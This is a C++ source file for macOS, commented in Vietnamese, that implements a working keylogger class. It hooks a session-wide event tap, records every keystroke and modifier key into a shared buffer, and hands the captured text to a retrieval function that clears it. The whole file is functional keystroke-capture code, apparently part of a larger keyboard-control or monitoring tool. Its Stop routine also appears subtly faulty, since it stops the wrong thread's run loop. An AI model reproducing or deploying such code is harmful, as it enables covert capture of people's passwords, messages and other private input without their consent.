#include "KeyboardController.h"
#ifdef __APPLE__

std::string Keylogger::_buffer = "";
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false) {}

Keylogger::~Keylogger() {
    Stop();
}

void Keylogger::append(const std::string& str) {
    std::lock_guard<std::mutex> lock(_mtx);
    _buffer += str;
}

// --- Callback xử lý sự kiện phím của macOS ---
CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
        return event;
    }

    // Lấy mã phím ảo
    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Xử lý các phím đặc biệt (Command, Shift, Caplock...)
    if (keyCode == kVK_Return) append("\n");
    else if (keyCode == kVK_Tab) append("[TAB]");
    else if (keyCode == kVK_Space) append(" ");
    else if (keyCode == kVK_Delete) append("[BACK]");
    else if (keyCode == kVK_Escape) append("[ESC]");
    else if (keyCode == kVK_Command) append("[CMD]");
    else if (keyCode == kVK_Shift || keyCode == kVK_RightShift) { /* Bỏ qua shift */ }
    else if (keyCode == kVK_CapsLock) append("[CAPS]");
    else if (keyCode == kVK_Option || keyCode == kVK_RightOption) append("[OPT]");
    else if (keyCode == kVK_Control || keyCode == kVK_RightControl) append("[CTRL]");
    else {
        // Chuyển mã phím thành ký tự Unicode (UTF-8)
        UniChar unicodeString[4];
        UniCharCount actualStringLength = 0;
        
        CGEventKeyboardGetUnicodeString(event, 4, &actualStringLength, unicodeString);
        
        if (actualStringLength > 0) {
            // Convert UniChar (UTF-16) sang std::string (UTF-8) đơn giản
            std::string s;
            for (int i = 0; i < actualStringLength; ++i) {
                // Lọc ký tự in được (ASCII cơ bản)
                if (unicodeString[i] >= 32 && unicodeString[i] <= 126) {
                    s += (char)unicodeString[i];
                }
            }
            if (!s.empty()) append(s);
        }
    }

    return event;
}

void Keylogger::MacLoop() {
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    
    eventTap = CGEventTapCreate(
        kCGSessionEventTap, 
        kCGHeadInsertEventTap, 
        kCGEventTapOptionDefault, 
        eventMask, 
        CGEventCallback, 
        this
    );

    if (!eventTap) {
        fprintf(stderr, "[Keylogger] Failed to create event tap. Check Accessibility Permissions!\n");
        return;
    }

    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    
    // Bắt đầu lắng nghe
    CGEventTapEnable(eventTap, true);
    
    // Chạy vòng lặp 
    CFRunLoopRun();
}

void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    _workerThread = std::thread([this]() {
        this->MacLoop();
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    if (runLoopSource) {
        CFRunLoopSourceInvalidate(runLoopSource);
        CFRelease(runLoopSource);
        runLoopSource = nullptr;
    }

    if (eventTap) {
        CFMachPortInvalidate(eventTap);
        CFRelease(eventTap);
        eventTap = nullptr;
    }
    
    CFRunLoopStop(CFRunLoopGetCurrent());
    
    if (_workerThread.joinable()) {
        _workerThread.detach(); 
    }
}

std::string Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx);
    if (_buffer.empty()) return "";
    std::string dataCopy = _buffer;
    _buffer.clear();
    return dataCopy;
}

#endif